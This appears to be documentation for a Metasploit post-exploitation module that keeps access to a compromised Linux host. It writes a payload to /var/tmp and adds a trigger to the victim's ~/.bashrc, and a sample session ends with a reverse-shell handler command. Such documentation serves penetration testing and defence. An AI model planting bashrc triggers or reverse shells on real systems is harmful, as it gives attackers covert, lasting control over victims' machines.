## Description

  This module establishes persistence via the Linux Bash profile method.
  This module makes two changes to the target system.
  First, the module writes a payload to a directory (`/var/temp/` by default).
  Second, the module writes a payload execution trigger to the Bash profile (`~/.bashrc` by default).
  The persistent payload is executed whenever the victim user opens a Bash terminal.

## Vulnerable Application

  This module has been tested successfully on:

  * Ubuntu 19 (x86_64) running GNU bash, version 5.0.3(1)-release

## Verification Steps

  1. Start `msfconsole`
  2. Get a Meterpreter session
  3. `use exploit/linux/local/bash_profile_persistence`
  4. `set SESSION [SESSION]`
  5. `run`
  6. On victim, open a new Bash terminal
  7. You should get a new session with the permissions of the exploited user account

## Options

  **BASH_PROFILE**

  The path to the target Bash profile. (default: `~/.bashrc`)

  **PAYLOAD_DIR**

  A writable directory file system path. (default: `/var/tmp`)

## Scenarios

```
msf5 > use exploit/linux/local/bash_profile_persistence
msf5 exploit(linux/local/bash_profile_persistence) > set SESSION 1
msf5 exploit(linux/local/bash_profile_persistence) > exploit

[*] Bash profile exists: /home/user/.bashrc
[*] Bash profile is writable: /home/user/.bashrc
[*] Created backup Bash profile: /root/.msf4/logs/persistence/192.168.1.191_20191128.130945_Bash_Profile.backup
[*] Writing '/var/tmp/IgHypGLMglheQ' (126 bytes) ...
[+] Wrote payload trigger to Bash profile
[!] Payload will be triggered when target opens a Bash terminal
[!] Don't forget to start your handler:
[!] msf> handler -H 0.0.0.0 -P 4444 -p cmd/unix/reverse_python
```
